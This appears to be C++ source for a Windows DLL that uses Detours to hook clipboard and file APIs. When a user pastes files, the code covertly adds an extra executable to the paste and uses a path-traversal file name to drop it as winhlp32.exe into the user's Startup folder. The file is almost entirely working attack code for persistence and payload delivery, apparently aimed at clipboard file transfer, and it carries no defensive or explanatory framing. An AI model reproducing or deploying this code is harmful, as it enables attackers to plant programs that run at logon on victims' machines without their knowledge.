#include "pch.h"
#include <strsafe.h>
#include <shellapi.h>
#include <stdio.h>
#include "detours.h"
#include <string>
#include <vector>
#pragma comment(lib,"Detours.lib")

WCHAR  evalfile[] = { L"C:\\windows\\winhlp64.exe" };
WCHAR  efile[] = { L"C:\\windows\\system32\\..\\..\\..\\..\\..\\../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/winhlp32.exe" };

// define fake api
// hook GetClipboardData for write our file to clipboard
using ptrGetClipboardData = HANDLE(WINAPI*)(UINT uformat);
ptrGetClipboardData realGetClipBoradData;
HANDLE WINAPI mGetClipBoardData(UINT uformat);

// hook CreateFileW and GetFileAttributesW for use the normal file path 
// avoid effect copy action
using ptrCreateFileW = HANDLE(WINAPI*)(__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile);
ptrCreateFileW realCreateFileW;
HANDLE WINAPI mCreateFileW(__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile);

using ptrGetFileAttributesW = DWORD(WINAPI*)(LPCWSTR lpFileName);
ptrGetFileAttributesW realGetFileAttributesW;
DWORD WINAPI mGetFileAttributesW(LPWSTR lpFileName);

// hook DragQueryFileW for change the path
using ptrDragQueryFileW = UINT(WINAPI*)(HDROP hDrop, UINT iFile, LPWSTR lpszFile, UINT cch);
ptrDragQueryFileW realDragQueryFileW;
UINT WINAPI mDragQueryFileW(HDROP hDrop, UINT iFile, LPWSTR lpszFile, UINT cch);

typedef struct DROPHEADER
{
	unsigned int data_offset;
	unsigned int unknown_val0;
	unsigned int unknown_val1;
	unsigned int unknown_val2;
	unsigned int val4 = 1;//default 1
	WCHAR data[0];
};

// fake api
HANDLE WINAPI mGetClipBoardData(UINT uformat)
{
	HANDLE rawdrop = realGetClipBoradData(uformat);

	if (uformat == CF_HDROP)
	{

		std::vector<std::wstring> dropfiels;
		DWORD dwFileNums = DragQueryFileW((HDROP)rawdrop, -1, NULL, NULL);
		WCHAR filename[MAX_PATH];
		for (int i = 0; i < dwFileNums; ++i)
		{
			DWORD filenamelen = DragQueryFileW((HDROP)rawdrop, i, NULL, NULL);
			DragQueryFileW((HDROP)rawdrop, i, filename, filenamelen + 1);
			dropfiels.push_back(filename);
		}

		dropfiels.push_back(efile);

		int needbytes = 0;
		for (auto filepath : dropfiels)
		{
			needbytes += filepath.length();
			needbytes += 1;
			needbytes += (filepath.length() + 1) * 2;
		}
		needbytes *= 2;
		needbytes += sizeof(DROPHEADER);
		DROPHEADER* dropfiles = (DROPHEADER*)new unsigned char[needbytes];
		RtlSecureZeroMemory(dropfiles, needbytes);
		dropfiles->data_offset = offsetof(DROPHEADER, data);
		dropfiles->val4 = 1;

		int offset = 0;
		for (auto filepath : dropfiels)
		{
			StringCchCopyW(&dropfiles->data[offset], needbytes, filepath.data());
			offset += filepath.length();
			offset += 1;
		}
		HGLOBAL modifiedrop = GlobalAlloc(GHND, needbytes);
		LPVOID buf = GlobalLock(modifiedrop);
		memcpy(buf, dropfiles, needbytes);
		GlobalUnlock(modifiedrop);
		GlobalFree(rawdrop);
		return modifiedrop;
	}
	else
	{
		return rawdrop;
	}
}

HANDLE WINAPI mCreateFileW(__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile)
{

	if (_wcsicmp(lpFileName, efile) == 0)
	{
		return realCreateFileW(evalfile, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	}
	else
	{
		return realCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	}
}

DWORD WINAPI mGetFileAttributesW(LPWSTR lpFileName)
{
	if (_wcsicmp(lpFileName, efile) == 0)
	{
		return realGetFileAttributesW(evalfile);
	}
	else
	{
		return realGetFileAttributesW(lpFileName);
	}
}

UINT WINAPI mDragQueryFileW(HDROP hDrop, UINT iFile, LPWSTR lpszFile, UINT cch)
{
	if (lpszFile != NULL || iFile == -1)
	{
		UINT ret = realDragQueryFileW(hDrop, iFile, lpszFile, cch);
		return ret;
	}
	else
	{
		WCHAR szFilePath[MAX_PATH];
		UINT ret = realDragQueryFileW(hDrop, iFile, szFilePath, MAX_PATH);
		StringCchCopyW(lpszFile, cch, szFilePath);
		return ret;
	}
}


void InstallHook()
{
	GetModuleHandleW(L"user32.dll");
	HMODULE huser32 = GetModuleHandleW(L"user32.dll");
	realGetClipBoradData = (ptrGetClipboardData)GetProcAddress(huser32, "GetClipboardData");

	realCreateFileW = (ptrCreateFileW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "CreateFileW");

	realGetFileAttributesW = (ptrGetFileAttributesW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"),
		"GetFileAttributesW");

	realDragQueryFileW = (ptrDragQueryFileW)GetProcAddress(GetModuleHandleW(L"shell32.dll"), "DragQueryFileW");

	DetourRestoreAfterWith(); // avoid repetition
	DetourTransactionBegin(); // start hook
	DetourUpdateThread(GetCurrentThread());
	long status = DetourAttach(&(LPVOID&)realGetClipBoradData, mGetClipBoardData);
	status = DetourAttach(&(LPVOID&)realCreateFileW, mCreateFileW);
	status = DetourAttach(&(LPVOID&)realGetFileAttributesW, mGetFileAttributesW);
	status = DetourAttach(&(LPVOID&)realDragQueryFileW, mDragQueryFileW);

	DetourTransactionCommit(); // commit hook
}


void UninstallHook()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	long status = DetourDetach(&(LPVOID&)realGetClipBoradData, mGetClipBoardData);
	status = DetourDetach(&(LPVOID&)realCreateFileW, mCreateFileW);
	status = DetourDetach(&(LPVOID&)realGetFileAttributesW, mGetFileAttributesW);
	status = DetourDetach(&(LPVOID&)realDragQueryFileW, mDragQueryFileW);
	DetourTransactionCommit();
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hModule);
		InstallHook();
		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		UninstallHook();
		break;
	}
	}
	return TRUE;
}